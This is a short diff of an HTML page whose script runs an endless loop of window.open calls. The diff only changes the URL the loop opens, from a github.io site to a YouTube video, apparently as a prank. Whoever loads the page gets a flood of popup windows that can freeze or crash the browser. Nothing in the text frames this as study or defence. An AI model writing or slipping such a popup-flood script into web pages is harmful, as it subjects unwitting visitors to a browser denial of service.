@@ -7,6 +7,6 @@ background-color: lightblue}
 <script>
 var a = true
 while (a == true)
-  window.open("https://cassius-root.github.io")
+  window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
 
 </script>
